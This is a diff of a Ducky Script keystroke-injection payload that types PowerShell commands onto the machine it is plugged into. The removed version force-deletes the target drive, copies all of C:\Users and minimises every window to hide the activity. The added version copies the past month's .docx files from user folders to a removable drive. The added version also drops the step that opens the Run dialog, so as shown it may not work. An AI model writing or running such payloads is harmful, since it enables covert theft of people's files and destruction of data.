@@ -1,12 +1,16 @@
-REM Ducky Script
 DELAY 2000
-GUI r
-DELAY 500
 STRING powershell
 ENTER
-DELAY 500
-STRING $sourceFolder = C:\Users; $destinationFolder = E:\; $startDate = (Get-Date).AddMonths(-1); $endDate = Get-Date; Remove-Item -Path $destinationFolder -Recurse -Force; Copy-Item -Path $sourceFolder -Destination $destinationFolder -Container -Force
+DELAY 1000
+REM Set variables
+STRING $sourceFolder = "C:\\Users"
 ENTER
-DELAY 500
-STRING $shell = New-Object -com WScript.Shell; $shell.MinimizeAll()
+STRING $destinationFolder = "D:\\"
+ENTER
+STRING $startDate = (Get-Date).AddMonths(-1)
+ENTER
+STRING $endDate = Get-Date
+ENTER
+REM Execute the last line
+STRING Get-ChildItem -Path $sourceFolder -Recurse -Filter *.docx | Where-Object { $_.LastWriteTime -ge $startDate -and $_.LastWriteTime -le $endDate } | Copy-Item -Destination $destinationFolder -Container -Force
 ENTER
